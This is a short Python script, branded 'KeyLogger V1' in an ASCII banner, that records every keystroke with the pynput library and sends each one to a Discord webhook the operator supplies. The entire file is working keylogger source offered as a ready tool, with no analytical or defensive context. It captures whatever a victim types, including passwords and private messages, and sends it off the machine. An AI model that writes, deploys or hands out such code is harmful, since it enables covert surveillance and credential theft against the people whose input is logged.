import requests
import threading
import time
from pynput import keyboard

logo = f"""
  _  __          _                                      __      ____ 
 | |/ /         | |                                     \ \    / /_ |
 | ' / ___ _   _| |     ___   __ _  __ _  ___ _ __       \ \  / / | |
 |  < / _ \ | | | |    / _ \ / _` |/ _` |/ _ \ '__|       \ \/ /  | |
 | . \  __/ |_| | |___| (_) | (_| | (_| |  __/ |     _     \  /   | |
 |_|\_\___|\__, |______\___/ \__, |\__, |\___|_|    (_)     \/    |_|
            __/ |             __/ | __/ |                            
           |___/             |___/ |___/                             
"""

WEBHOOK_URL = input("Discord Webhook URL: ")

def send_to_discord(data):
    try:
        payload = {"content": f"```\n{data}\n```"}
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            send_to_discord(key.char)
        else:
            send_to_discord(str(key))
    except:
        pass

print("[+] Keylogger running. Press Ctrl+C to stop.")
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
